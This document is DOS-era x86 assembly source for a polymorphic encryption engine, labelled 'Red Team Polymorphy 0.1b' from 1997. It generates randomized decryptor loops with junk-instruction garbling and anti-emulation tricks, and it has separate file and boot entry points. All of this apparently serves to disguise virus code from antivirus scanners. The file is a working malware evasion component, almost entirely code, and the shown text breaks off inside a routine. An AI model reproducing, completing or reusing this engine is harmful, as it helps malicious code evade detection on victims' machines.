   ;JUMPS
   ;include c:\asm\star.inc
   ;============================================================================

   ENGINE_LENGTH = ENGINE_END - ENGINE_START
   ENGINE_START = $

   ;****************************************************************************
   ;* Conditional Assembly *****************************************************
   ;****************************************************************************

   ;ENABLE DEBUG_ENCRYPTOR
   ;ENABLE DISPLAY_STATUS

   ENABLE  MULTI_LAYER

   ENABLE  GARBLING
   ENABLE  GARBLE_REG8
   ENABLE  GARBLE_IMM
   ENABLE  GARBLE_RM
   ENABLE  GARBLE_RM_REG
   ENABLE  GARBLE_RM_MEM
   ENABLE  GARBLE_MANY_JUNK_OPS
   ENABLE  GARBLE_PUSH_POP
   ENABLE  GARBLE_JCOND
   ENABLE  GARBLE_JMP_CALL
   ENABLE  GARBLE_LOOP
   ENABLE  GARBLE_INT
   ENABLE  GARBLE_ANTI_EMUL0
   ENABLE  GARBLE_ANTI_EMUL1
   ENABLE  GARBLE_ANTI_EMUL2

   STATUS  MACRO   str
       local   l1

       ifdef display_status

       pushf
       pusha
       push    ds
       call    l1
       db  "&str&"
       db  0Dh,0Ah,'$'
    l1:    pop dx
       push    cs
       pop ds
       mov ah,09h
       int 21h
       pop ds
       popa
       popf

       endif

       ENDM


   ;****************************************************************************
   ;* Equates ******************************************************************
   ;****************************************************************************

   JUNK_ROUT_MAX   =   25

   Reg16s      ENUM    {_AX,_CX,_DX,_BX,_SP,_BP,_SI,_DI}
   Reg8s       ENUM    {_AL,_CL,_DL,_BL,_AH,_CH,_DH,_BH}
   Indexes     ENUM    {iBX_SI,iBX_DI,iBP_SI,iBP_DI,iSI,iDI,iBP,iBX}

   ; R/M's
   rm_00   equ 000h
   rm_08   equ 040h
   rm_16   equ 080h
   rm_Reg  equ 0C0h

   ; 00h, 80h family
   _ADD    =   00h
   _OR =   08h
   _ADC    =   10h
   _SBB    =   18h
   _AND    =   20h
   _SUB    =   28h
   _XOR    =   30h
   _CMP    =   38h

   ; C0h, D0h family
   _ROL    =       00h
   _ROR    =       08h
   _RCL    =       10h
   _RCR    =       18h
   _SHL    =       20h
   _SHR    =       28h
   _SAL    =       30h
   _SAR    =       38h

   ; FEh family
   _INC    =   00h
   _DEC    =   08h
   _CALLN  =   10h
   _CALLF  =   18h
   _JMPN   =   20h
   _JMPF   =   28h
   _PUSH   =   30h

   ; F6h family
   _TEST   =   00h
              ;08h
   _NOT    =   10h
   _NEG    =   18h
   _MUL    =   20h
   _IMUL   =   28h
   _DIV    =   30h
   _IDIV   =   38h

   ; 70h family
   _JO     =       70h
   _JNO    =       71h
   _JC     =       72h
   _JNC    =       73h
   _JZ     =       74h
   _JNZ    =       75h
   _JAE    =       76h
   _JA     =       77h
   _JS     =       78h
   _JNS    =       79h
   _JPZ    =       7Ah
   _JPO    =       7Bh
   _JL     =       7Ch
   _JGE    =       7Dh
   _JLE    =       7Eh
   _JG     =       7Fh

   ;****************************************************************************
   ;** Polymorphic Engine ******************************************************
   ;****************************************************************************
   ;

   db 'Red Team Polymorphy 0.1b - (c) 1997 The Soul Manager [IR/G]',0

   ;============================================================================
   ;
   ; INPUT:
   ; ds:si = code to crypt
   ; es:di = where to do it
   ; cx = how much
   ; bx = delta offset where code will start
   ; dx = offset into code for execution to continue
   ;
   ; OUTPUT:
   ; ds:dx = where to write from
   ; cx = how much
   ; ax = ip

   rtp_file:
       IFDEF   MULTI_LAYER

           push    bx
           push    cx
       ENDIF
           call    rtp_boot

       IFDEF   MULTI_LAYER
           pop     dx
           sub     cx,dx        ; cx = how much
           xchg    dx,ax        ; dx = ret IP offset
           mov     bx,dx        ; bx = delta offset
           mov     wo cs:[decryptor_garble],ofs dos_garble
           push    cx
           call    __rtp
           pop     dx
           sub     cx,dx        ; cx = how much
           xchg    dx,ax        ; dx = ret IP offset
           mov     bx,dx        ; bx = delta offset
           call    __rtp
           pop     dx
           mov cx,di
           sub cx,dx
       ENDIF
           ret

   ;============================================================================
   ;
   ; INPUT:
   ; ds:si = code to crypt
   ; es:di = where to do it
   ; cx = how much
   ; bx = delta offset where code will start
   ; dx = offset into code for execution to continue
   ;
   ; OUTPUT:
   ; ds:dx = where to write from
   ; cx = how much
   ; ax = ip

   rtp_boot:   IFDEF   MULTI_LAYER
             mov   wo cs:[decryptor_garble],ofs no_garble
           ELSE
             mov   wo cs:[decryptor_garble],ofs dos_garble
           ENDIF
           push    cx bx bx
           mov ax,es
           lea bx,[bx+di+0Fh]
           shr bx,4
           add ax,bx
           pop di
           mov es,ax
           cld
           rep movsb
           pop bx
           add dx,bx
           pop cx
           ;
   __rtp:      ; cx = howmuch
           ; es:di = where to build decryptor
           ; bx = delta offset where code starts
           ; dx = after jmp dest adjusted for delta ofs
           ;
           push    cs
           pop ds
           mov wo ds:[crypt_start],bx  ; delta
           mov wo ds:[after_jmp],dx    ; delta + offset into code
           mov wo ds:[count_bytes],cx  ; how much
           call    poly_setup
           ;
           ; ** Build Encryptor **
           ;
           STATUS  <Build Encryptor>
           push    di
           push    cs
           push    ofs encrypt_return
           push    es di
           mov wo ds:[rng_seed],ofs e_seed
           mov wo ds:[routine_type],ofs create_encryptor
           mov wo ds:[garble_routines],ofs no_garble

       IFDEF   DEBUG_ENCRYPTOR

           STO_B   0CCh

       ENDIF

           call    make_routine
           STO_B   0CBh
           STATUS  <Call Encryptor>
           retf
           ;
           ; ** Code was just Encrypted **
           ;
       encrypt_return:
           ;
           ; ** Build Decryptor **
           ;
           STATUS  <Encryptor Returned - Building Decryptor>
           pop di
           and wo ds:[junk_rout_ptr],0
           mov wo ds:[rng_seed],ofs d_seed
           mov wo ds:[routine_type],ofs create_decryptor
           mov wo ds:[garble_routines],ofs dos_garble
   decryptor_garble=   $-2
           push    wo ds:[used_regs]
           and by ds:[poly_flags],NOT pf_inloop
           mov wo ds:[used_regs], BIT (_SP + _AH)
           mov cx,7
           call    garble
           pop wo ds:[used_regs]
           call    make_routine
           and by ds:[poly_flags],NOT pf_inloop
           mov wo ds:[used_regs], BIT (_SP + _AH)
           call    garble4
           mov bx,wo ds:[after_jmp]
           call    encode_jmp

       IFDEF   GARBLING

           call    make_junk_routs
       ENDIF
           scasw
           ;
           ; ** Load Output Registers **
           ;
           STATUS  <Load Output Registers>
           push    di
           mov ax,wo ds:[crypt_start]
           mov dx,ax
           add ax,wo ds:[count_bytes]
           push    es
           pop ds
           sub di,dx
           mov cx,di
           pop di
           ret

   ;----------------------------------------------------------------------------
   make_routine:   STATUS  <MAKE_ROUTINE>
           and by ds:[poly_flags],NOT pf_inloop
           push    wo ds:[m_index]
           push    wo ds:[m_index.2]
           and wo ds:[last_crypt_op],0
           mov si,ofs initr_list
           call    do_steps
           call    garble4
           or  by ds:[poly_flags],pf_inloop
           push    di          ; loop start
           mov si,ofs loopr_list
           call    do_steps
           pop bx                      ; loop end
           pop wo ds:[m_index.2]
           pop wo ds:[m_index]
           call    plaintxt_to_index
           call    garble4
           jmp encode_loop

   ;****************************************************************************
   ;** Fundamental Stuff *******************************************************
   ;****************************************************************************
   ;
   ;= Basic Setup ==============================================================
   ;
   ; INPUT:
   ; none.
   ;
   ; OUTPUT:
   ; M_* initialised.
   ; regs destroyed

   pf_dblref   =   00001b
   pf_backward =   00010b
   pf_word     =   00100b
   pf_inloop   =   01000b

   poly_setup: STATUS  <POLY_SETUP>
           ;
           ; ** Initialise RNG **
           ;
           STATUS  <Initializing RNG>
           sti
           mov cx,800h
           xor si,si
           xor bx,bx
           xor dx,dx
           push    di ds
           mov ds,si
           DO
            lodsw
            xchg   bp,ax
            in ax,40h
            add    ax,bp
            mov    di,8
            DO
             shr   ax,1
             rcr   dx,1
             rcr   bx,1
             DOIF  C
              xor  dx,04C1h
              xor  bx,1DB7h
             DONE
             dec   di
            CYCLE  NZ
           CYCLE   LU
           pop ds di
           mov wo ds:[master_seed.wLO],bx
           mov wo ds:[master_seed.wHI],dx
           call    init_rng_seeds

           STATUS  <Setting POLY_FLAGS>
           call    any_rand
           mov wo ds:[initial_key],ax
           mov wo ds:[used_regs], BIT (_SP + _AH)
           call    any_rand    ; ** set flags
           and al,pf_backward OR pf_word
           call    probability
           DOIF    BE      ; 1/4  chance of no dbl ref
            inc    ax      ; (CF=ZF=0). pf_dblref=1
           DONE
           mov by ds:[poly_flags],al

           STATUS  <Choose Count Method>
           mov al,6        ; ** choose count_method
           call    rand_b
           mov wo ds:[count_meth],ax
           mov ax,07FFFh   ; ** choose count MUL'r
           cwd
           div wo ds:[count_bytes]
           dec ax
           MAX ax,25
           call    rand
           inc ax
           mov wo ds:[count_mul],ax

           STATUS  <Choose Index>
           DO
             call  any_rand    ; ** choose index
             and   al,11000011b    ; clear op field
             or    al,4        ; single reg ptrs only
             cmp   al,iBP+rm_00    ; no imm16
            REPEAT E
             cmp   al,rm_Reg
           CYCLE   AE      ; no reg
           mov si,ofs m_index
           mov by ds:[si+1],al ; save ModRM-for plaintxt too
           mov by ds:[si+(ofs m_plaintxt-ofs m_index)+1],al
           call    create_m_ofs
           call    plaintxt_to_index
           and al,3
           mov bx,ofs index_to_reg_table
           xlat
           call    save_modrm16
           mov wo ds:[si+(ofs m_ptr - ofs m_index)-2],ax

           STATUS  <Choose Count_Reg>
           DO
             call  get_free_reg16  ; get count reg
             test  by ds:[si+(ofs poly_flags - ofs m_index)-2],pf_word
            EXIT   NZ
             cmp   al,_BX
           CYCLE   A
           call    save_modrm16
           mov wo ds:[si+(ofs m_count - ofs m_index)-2],ax
           xor cx,cx
           test    by ds:[si+(ofs poly_flags - ofs m_index)-2],pf_word
           DOIF    NZ
            inc    cx
           DONE
           mov by ds:[si-2],cl
           mov by ds:[si+(ofs m_plaintxt - ofs m_index)-2],cl

           STATUS  <Choose Key_Reg, Plaintxt_Reg>
           mov si,ofs m_key            ; set key reg
           test    by ds:[si+(ofs poly_flags - ofs m_key)],pf_dblref
           DOIF    NZ
            call   create_regmodrm
            lodsw
           DONE                    ; set plaintxt reg

   ; INPUT:
   ; si = ofs of modrm object
   ; cx = modrm size (1=16 bit)
   ;
   ; OUTPUT:
   ; si = create modrm

   create_regmodrm:    STATUS  <CREATE_MODRM>
               jcxz    @crm0
                 call  get_free_reg16
                 call  allocate_reg16
                jmp    @crm1
                @crm0:
                 call  get_free_reg8
                 call  allocate_reg8
               @crm1:
               mov ah,cl
               or  al,rm_Reg
               xchg    ah,al
               mov wo ds:[si],ax
               ret

   index_to_reg_table: db      _SI
               db      _DI
               db      _BP
               db  _BX

   ; just something to save a few bytes

   save_modrm16:       call    allocate_reg16
               or  ax,0100h + rm_Reg   ; create ModRM
               xchg    ah,al
               ret

   ;= ModRM Object stuff =======================================================
   ;
   ; INPUT:
   ; ds:si = ModRM object
   ; es:di = pos. to store offset
   ;
   ; OUTPUT:
   ; es:di = end of stored offset

   store_m_ofs:        ;STATUS <STORE_M_OFS>
               push    ax
               lodsw
               call    test_modrm
               lodsw
               DOIF    PO
                 DOIF  NS
                   stosb           ; 8 bit
                   cmp al,?
                   org $-1     ; JMP $+3
                 DONE
                 stosw             ; 16 bit
               DONE
               pop ax
               ret


   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ds:si = ModRM object
   ;
   ; OUTPUT:
   ; ds:si-2 = ModRM object with suitable offset

   create_m_ofs:       STATUS  <CREATE_M_OFS>
               push    ax
               lodsw
               call    test_modrm
               pushf
               call    any_rand
               popf
               DOIF    PE
                xor    ax,ax
               DONE
               DOIF    NS
                cbw
               DONE
               mov wo ds:[si],ax
               pop ax
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ah = ModRM
   ;
   ; OUTPUT:
   ; flags for offset..

   test_modrm:     push    ax
               cmp ah,iBP
               DOIF    E
                or ah,rm_16
               DONE
               test    ah,11000000b
               pop ax
               ret

   ;= Code Optimisation ========================================================
   ;
   ; Optimisations:    push signable imm16     68h
   ;           ShiftOP ModRM, Mask and 0Fh C0h, C1h
   ;                       ShiftOP ModRM, 1        C0h, C1h
   ;           AriOP ModRM, signable imm16 81h
   ;           AriOP AX,imm16          81h
   ;           AriOP AL,imm8           80h
   ;           inc/dec Reg16           FFh
   ;           test al,ax          F6h, F7h

   Optimise_Item   MACRO   a,b
           PUSHSTATE
           .386

           db  NOT a
           dw  (ofs b - ofs optimise_table)

           POPSTATE
           ENDM

   optimise_table:     Optimise_Item   068h, opt_68
               Optimise_Item   0C0h, opt_C0
               Optimise_Item   0C1h, opt_C0
               Optimise_Item   081h, opt_81
               Optimise_Item   080h, opt_80
               Optimise_Item   0F6h, opt_F6
               Optimise_Item   0F7h, opt_F7
               Optimise_Item   0FFh, opt_FF
               Optimise_Item   026h, opt_sego
               Optimise_Item   02Eh, opt_sego
               Optimise_Item   000h, null_func
   no_of_optimisers    =   (ofs $ - ofs optimise_table)/3

   ; INPUT:
   ; es:bx = start of instruction
   ; es:di = end of instruction
   ;
   ; OUTPUT:
   ; es:di = new end of instruction

   optimise:       STATUS  <OPTIMISE>
               push    ax cx dx si
               mov si,ofs optimise_table
               mov cx,no_of_optimisers
               DO
                lodsb
                xor    al,by es:[bx]
                inc    al
                pushf
                lodsw
                add    ax,ofs optimise_table
                popf
               CYCLE   LUNE
               call    ax
               pop si dx cx ax
               ret

   ;----------------------------------------------------------------------------

               ;----------------------------------------------------
               ; 068h - PUSH imm16
               ;
       opt_68:     mov ax,wo es:[bx.1]
               call    is_ax_signed
               DOIF    E
                mov    by es:[bx],06Ah
                dec    di
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ; C0h,C1h - ShiftOP ModRM, imm8
               ;
       opt_C0:     and by es:[di-1],0Fh
               cmp by es:[di-1],1
               DOIF    E
                dec    di
                xor    by es:[bx], 0D0h XOR 0C0h
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ; 80h - AriOP ModRM, imm8
               ;
       opt_80:     mov ax,wo es:[bx.1]
               cmp al,rm_REG
               DOIF    NB
                 test  al,00000111b
                ANDIF  Z
                 xor   al,11000100b
                 mov   wo es:[bx],ax
                 dec   di
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ; 81h - AriOP ModRM, imm16
               ;
       opt_81:     mov al,by es:[bx.1]
               cmp al,rm_REG
               DOIF    AE
                 test  al,00000111b
                ANDIF  Z
                ; Use special AX ops.
                 xor   al,11000101b
                 mov   by es:[bx],al
                 push  wo es:[bx.2]
                 pop   wo es:[bx.1]
                 dec   di
                 ret
               DONE
               ; Sign imm16.
               mov ax,wo es:[di-2] ; ax = imm arg
               call    is_ax_signed    ; check if sign extendable
               DOIF    E
                dec    di      ; ignore high byte
                mov    by es:[bx],83h  ; sign it
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ; FFh - inc/dec ModRM
               ;
       opt_FF:     mov al,by es:[bx.1]
               sub al,(0C0h - 40h)
               cmp al,40h
               DOIF    AE
                 cmp   al,50h
                ANDIF  B
                 mov   di,bx
                 stosb
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ; F6h - test al
               ; F7h - test ax
       opt_F6:     ;
       opt_F7:     cmp by es:[bx.1],rm_REG OR _TEST OR _AX
               DOIF    E
                push   wo es:[bx.2]
                pop    wo es:[bx.1]
                sub    by es:[bx],(0F6h - 0A8h)
                dec    di
               DONE
               ret
       ;----------------------------------------------------

               ;----------------------------------------------------
               ;Segment Overrides
               ;
       opt_sego:       test    by es:[bx.2],0C0h
               DOIF    NZ
                ANDIF  PE
                push   bx
                DO
                 mov   al,es:[bx+1]
                 mov   es:[bx],al
                 inc   bx
                 cmp   bx,di
                CYCLE  NE
                pop    bx
                dec    bx
                dec    di
               DONE
               inc bx
               jmp optimise
       ;----------------------------------------------------

   ;= Register Management ======================================================
   ;
   ; INPUT:
   ; al = reg8
   ;
   ; OUTPUT:
   ; ax = regs usage mask

   get_reg8_mask:      push    cx
               and al,7
               mov cx,1
               xchg    cx,ax
               shl ax,cl
               pop cx
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; al = reg16
   ;
   ; OUTPUT:
   ; ax = regs usage mask

   get_reg16_mask:     push    cx dx
               call    get_reg8_mask
               mov cx,(BIT _AL) OR (BIT _AH)
               cmp al,(BIT _SP)
               DOIF    AE
                ;;mov  cl,(BIT (_AH - _AL))
                dec    cx
               DONE
               mul cx
               pop dx cx
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; al = reg8
   ;
   ; OUTPUT:
   ; register allocated

   allocate_reg8:      push    ax
               call    get_reg8_mask
               jmp __areg

   ; INPUT:
   ; al = reg16
   ;
   ; OUTPUT:
   ; register allocated

   allocate_reg16:     push    ax
               call    get_reg16_mask
       __areg:     or  wo ds:[used_regs],ax
               pop ax
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; none
   ;
   ; OUTPUT:
   ; al = unused reg8

   get_free_reg8:      ;STATUS <GET_FREE_REG8>

               push    bx
               mov bx,ofs get_reg8_mask
               jmp __gfreg

   ; INPUT:
   ; none
   ;
   ; OUTPUT:
   ; al = unused reg16

   get_free_reg16:     ;STATUS <GET_FREE_REG16>

               push    bx
               mov bx,ofs get_reg16_mask
       __gfreg:    DO
                call   rand7
                push   ax
                call   bx
                test   wo ds:[used_regs],ax
                pop    ax
               CYCLE   NZ
               pop bx
               ret

   ;= Misc. ====================================================================
   crypt_done      =   00111110b
   mods_done       =   11111101b
   loadtxt_done        =   11111011b
   savetxt_done        =   11110111b
   incptr_done     =   11101111b
   deccount_done       =   11011111b

   loopr_list:
       dbw     16,<ofs create_encryptor>
   routine_type        =   $-2
       dbw     16,<ofs make_mod>
       dbw     16,<ofs inc_ptr>
       dbw     16,<ofs dec_count>
       dbw     20,<ofs load_plaintxt>
       dbw     16,<ofs save_plaintxt>

   initptr_done        =   00000110b
   initcount_done      =   11111101b
   initkey_done        =   11111011b

   initr_list:
       dbw     34,<ofs load_key>
       dbw     33,<ofs load_ptr>
       dbw     33,<ofs load_count>

   ;-Randomize Order of Steps---------------------------------------------------
   ;
   ; INPUT:
   ; si = percentage weighted list of steps
   ;
   ; OUTPUT:
   ; they get run randomly.. duh.

   do_steps:       or  by ds:[poly_done],-1
               DO
                push   si
                call   percent_ax
                call   ax
                pop    si
                test   by ds:[poly_done],-1
               CYCLE   NZ
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ax = whateva
   ;
   ; OUTPUT:
   ; ZF = AX is signable

   is_ax_signed:       push    bx
               mov bx,ax
               cbw
               cmp ax,bx
               pop bx
               ret

   ;-Pick Option from List------------------------------------------------------
   ;
   ; INPUT:
   ; si = op list
   ;
   ; OUTPUT:
   ; al = op
   ; si = end of op list

   pick_op:        push    dx
               lodsb
               cbw
               mov dx,ax
               add dx,si
               call    rand
               add si,ax
               lodsb
               mov si,dx
               pop dx
               ret

   ;-Pick Option from Percentage weighted List----------------------------------
   ;
   ; INPUT:
   ; ds:si = percentage table
   ;
   ; OUTPUT:
   ; ax = selection
   ; si destroyed

   percent_ax:     mov al,100
               call    rand_b
               mov ah,al
               DO
                lodsb
                sub    ah,al
                inc    si
                inc    si
               CYCLE   NC
               mov ax,wo ds:[si-2]
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; none.
   ;
   ; OUTPUT:
   ; none.

   plaintxt_to_index:  test    by ds:[poly_flags],pf_dblref
               DOIF    Z
                push   wo ds:[m_index]
                push   wo ds:[m_index.2]
                pop    wo ds:[m_plaintxt.2]
                pop    wo ds:[m_plaintxt]
               DONE
               ret

   ;****************************************************************************
   ;* Routines to Load Registers ***********************************************
   ;****************************************************************************
   ;
   ; INPUT:
   ; al = reg8
   ; bl = value to load
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = end of construction

   load8:          push    ax bx cx
               mov ah,0
               jmp __load

   ; INPUT:
   ; al = reg16
   ; bx = value to load
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = end of construction

   load16:         push    ax bx cx
               mov ah,1

       __load:     DO
               call    probability
                DOIF   Z
                  or   al,0B8h     ; MOV reg16,xxxx
                  or   ah,ah
                  DOIF NZ
                    stosb
                    xchg  bx,ax
                    stosw
                   DOELSE
                    xor   al,8
                    mov   ah,bl
                    stosw
                  DONE
                 DOELSE
                  mov  cx,ax       ; Zero R, add/or/xor r,xxxx
                  xchg ah,al
                  call zero_reg
                  push di
                  call choose_fake_mov
                  add  ax,08000h + rm_Reg
                  add  ax,cx
                  xchg ah,al
                  stosw
                  xchg bx,ax
                  stosw
                  pop  bx
                  or   ch,ch
                  DOIF Z
                   dec di
                  DONE
                  call optimise
                DONE
               DONE
               pop cx bx ax
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ax = reg8/reg16 ModRM style (AH's 0C0h not needed)
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   zero_reg:       push    si
               mov si,ofs zero_reg_script
               call    zero_test_reg
               pop si
               ret

   zero_reg_script:    db 02, _XOR, _SUB
               db 01, _AND

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ax = reg8/reg16 ModRM style (AH's 0C0h not needed)
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete


   test_reg_script:    db 03, _OR, _AND, 84h       ; 84h=test R,RM
               db 05, _ADD, _OR, _SUB, _XOR, _CMP

   test_reg:
               mov si,ofs test_reg_script

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ax = reg8/reg16 ModRM style (AH's 0C0h not needed)
   ; si = script (zero_reg_script or test_reg_script)
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   zero_test_reg:      push    ax bx
               xchg    bx,ax       ; BX=xx000Rrr 0000000w
               call    pick_op
               call    probability
               DOIF    Z
                 xchg  bx,ax       ; AX=xx000Rrr 0000000w
                 add   al,bl       ; AX=xx000Rrr 00Iii00w
                 stosb
                 mov   al,rm_Reg   ; AX=xx000Rrr 11000000
                 and   ah,7        ; AX=00000Rrr 11000000
                 aad   9           ; AL = AH + (AL*9)
                DOELSE         ; AL=11RrrRrr
                 call  pick_op
                 or    ax,08000h + rm_Reg  ; AriOp8, reg ModRM
                 or    al,bh           ; reg added
                 or    bl,bl
                 DOIF  NZ
                  mov  ah,83h      ; signed16
                 DONE
                 xchg  ah,al       ; CommandByte 1st
                 stosw         ; stored
                 xor   ax,ax
               DONE
               stosb           ;    00Iii00w 11RrrRrr stored
               pop bx ax
       @lcntr:     ret

   ;= Object specific stuf =====================================================

   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   load_count:     test    by ds:[poly_done],NOT initcount_done
               jz  @lcntr
               and by ds:[poly_done],initcount_done
               call    garble4
               mov ax,?
   count_bytes     =   $-2
               test    by ds:[poly_flags],pf_word
               DOIF    NZ
                inc    ax
                shr    ax,1
               DONE
               mul wo ds:[count_mul]
               mov bx,wo ds:[count_meth]
               xor si,si
               shr bx,1
               DOIF    C
                 inc   si
                 inc   si
                cmp    ax,?
                org    $-2
               DONE
                neg    ax
               add si,bx
               shl bx,2
               add ax,wo ds:[loop_table.si.bx.1]
               xchg    bx,ax
               mov al,by ds:[m_count.1]
       lptrcnt:    and al,7
               jmp load16

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   load_ptr:       test    by ds:[poly_done],NOT initptr_done
               jz  @@txtr
               and by ds:[poly_done],initptr_done
               call    garble4
               mov ax,?
   crypt_start     =   $-2
               test    by ds:[poly_flags],pf_backward
               DOIF    NZ
                add    ax,wo ds:[count_bytes]
                dec    ax
                test   by ds:[poly_flags],pf_word
                DOIF   NZ
                 dec   ax
                DONE
               DONE
               sub ax,wo ds:[m_index.2]
               xchg    bx,ax
               mov al,by ds:[m_ptr.1]
       lptrcntkey: jmp lptrcnt

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   load_key:       test    by ds:[poly_done],NOT initkey_done
           @@txtr: jz  @txtr
               and by ds:[poly_done],initkey_done
               call    garble4
               mov bx,?
   initial_key     =   $-2
               mov al,by ds:[m_key.1]
               test    by ds:[poly_flags],pf_word
               jnz lptrcntkey
               and al,7
               jmp load8

   ;= RegMem/MemReg warez ======================================================

   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   save_plaintxt:      mov al,by ds:[poly_done]
               ; crypt=0, savetxt=1
               xor al,NOT savetxt_done
               test    al,(NOT savetxt_done) OR (NOT crypt_done)
               jnz @txtr
               mov by ds:[poly_done],al
               call    garble4
               mov si,ofs m_index
               mov ax,wo ds:[m_plaintxt]
               cmp ah,rm_Reg
               jb  sptxt_exit_b
               mov al,088h     ; MOV M,R
               jmp mtr_put_b

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   load_plaintxt:      test    by ds:[poly_done],NOT loadtxt_done
               DOIF    Z
       @txtr:       ret
               DONE

               and by ds:[poly_done],loadtxt_done
               call    garble4
               mov si,ofs m_index
               mov ax,wo ds:[m_plaintxt]
               cmp ah,rm_Reg
       sptxt_exit_b:   jb  null_func
               call    probability
               DOIF    Z; MOV R,M
                 mov   al,08Ah     ; al = command, ah = reg
                 ;
       mtr_put_b:    call  probability
                 DOIF  S
                  mov  al,086h     ; XCHG R,M
                 DONE
       mtr_put:      push  ax
                 STO_B 02Eh        ; CS:
                 pop   ax
                 shl   ah,3
                 and   ax,38FFh
                 or    ax,wo ds:[si]
                 stosw
                 call  store_m_ofs
   null_func:        ret
                DONE
                ;DOELSE
                 call  zero_reg    ; Zero R, ADD/OR/ADC/XOR R,M
                 xchg  bx,ax
                 call  choose_fake_mov ; al = command
                 add   al,2
                 mov   ah,bh       ; ah = reg
                 jmp   mtr_put
                ;DONE

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; none
   ;
   ; OUTPUT:
   ; al = fake mov op

   choose_fake_mov:    call    any_rand
               and ax,_SBB     ; add/or/adc/sbb
               cmp al,_SBB
               DOIF    E
                mov    al,_XOR     ; add/or/adc/xor
               DONE
               ret

   ;****************************************************************************
   ;* Crypt Routines ***********************************************************
   ;****************************************************************************
   ;
   ; INPUT:
   ; ds:bx = Crypt Script
   ; es:di = Construction Buffer
   ;
   ; OUTPUT:
   ; es:di = end of construction
   ; bx = end of script

   create_decryptor:   mov al,by ds:[poly_done]
               ;loadtxt=0, crypt=1
               xor al,NOT crypt_done
               test    al,(NOT loadtxt_done) OR (NOT crypt_done)
               DOIF    Z
                mov    by ds:[poly_done],al
                call   get_crypt_level
                DO
                 clc
                 push  cx
                 call  make_crypt_op
                 call  garble1
                 pop   cx
                CYCLE  LU
               DONE
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; ds:bx = End of Crypt Script
   ; es:di = Construction Buffer
   ;
   ; OUTPUT:
   ; es:di = end of construction
   ;
   ; Encryptor:
   ;       JMP LOC1
   ;   LOC3:   JMP LOC2
   ;       ENC1
   ;       JMP LOC3
   ;       ENC2
   ;       JMP ENC1
   ;       ENC3
   ;       JMP ENC2
   ;   LOC1:   ENC4
   ;       JMP ENC3
   ;   LOC2:   ...

   create_encryptor:   mov al,by ds:[poly_done]
               ;loadtxt=0, crypt=1
               xor al,NOT crypt_done
               test    al,(NOT loadtxt_done) OR (NOT crypt_done)
               DOIF    Z
                mov    by ds:[poly_done],al
                mov    wo ds:[rng_seed],ofs junk_seed
                call   _encode_jmp
                push   bx      ; save loc1 reloc
                push   di
                call   _encode_jmp
                pop    bp
                push   bx      ; save loc2 reloc
                mov    wo ds:[rng_seed],ofs e_seed
                call   get_crypt_level
                DO
                 push  di
                 stc
                 push  cx
                 call  make_crypt_op
                 pop   cx
                 mov   bx,bp
                 mov   wo ds:[rng_seed],ofs junk_seed
                 call  encode_jmp
                 mov   wo ds:[rng_seed],ofs e_seed
                 pop   bp
                CYCLE  LU
                pop    bx
                add    wo es:[bx],di
                pop    bx
                add    wo es:[bx],bp
               DONE
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = code construct buffer
   ; NC for decryptor, CF for encryptor
   ;
   ; OUTPUT:
   ; es:di = construction complete

   ; During Execution:
   ; -----------------
   ; ax = CryptOp
   ; si = ofs object
   ; cl = enc/dec
   ; ch -> op to use

   make_crypt_op:      STATUS  <MAKE_CRYPT_OP>
               mov wo ds:[crypt_obj],ofs m_plaintxt
               mov by ds:[mod_crypt_switch],mods_and_crypts
       make_modcryp:   push    bp
               sbb cx,cx
               push    bx
               push    di
               STO_B   02Eh        ; CS:
               DO
                mov    si,ofs crypt_ops
                call   percent_ax
                cmp    ax,?
   last_crypt_op        =  $-2
               CYCLE   E
               mov wo ds:[last_crypt_op],ax
               not ax
               mov si,?
   crypt_obj       =   $-2
               mov bx,wo ds:[si]
               mov ch,ah
               push    ax
               mov al,2
               call    rand_b
               add al,cl
               pop ax
               DOIF    Z
                shr    ch,3        ; op2 -> op1
               DONE
               and ch,00011100b
               shr al,1        ; creating byte 0
               DOIF    NC      ; store op in byte 1?
                or al,ch
                xor    ch,ch
                push   di      ; di.1 = place to store reg2
               DONE
               shl al,1
               or  al,bl
               stosb
               mov al,ch       ; creating byte 1
               add al,al
               or  al,bh
               stosb
               call    store_m_ofs ; add ModRM ofs
               and ah,3        ; arguments
               DOIF     NZ     ; 0 ( No arg)
                DOIF     PO        ; 3 ( Reg )
                  and     ah,bl        ; 1 or 2?
                  DOIF    NZ
                   call    any_rand    ; 1
                   stosb
                  DONE
                  call    any_rand
                  stosb
                  ; Register Args
                 DOELSE
                  DO
                    ;
                    ; ** Pick a register. **
                    ;
                    call  rand7
                    call    probability
                    DOIF    A
                     ;
